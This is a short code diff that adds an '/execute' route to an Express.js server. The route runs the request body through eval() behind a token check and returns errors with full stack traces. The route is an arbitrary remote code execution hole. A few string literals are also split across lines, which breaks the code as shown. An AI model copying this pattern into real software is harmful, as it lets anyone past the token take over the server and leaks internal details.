@@ -127,6 +127,23 @@ app.post('/answer', (req, res) => {
   res.status(200).send(responseText);
 });
 
+// Execute endpoint
+app.post("/execute", checkToken, (req, res) => {
+ const code = req.body;
+ if (!code) {
+ return res.status(400).json({ error: "No code pr
+ovided" });
+ }
+ try {
+ // Execute the code
+ const result = eval(code);
+ res.json({ result });
+ } catch (error) {
+ res.status(500).json({ error: error.message, tra
+ce: error.stack });
+ }
+});
+
 // Start the server
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
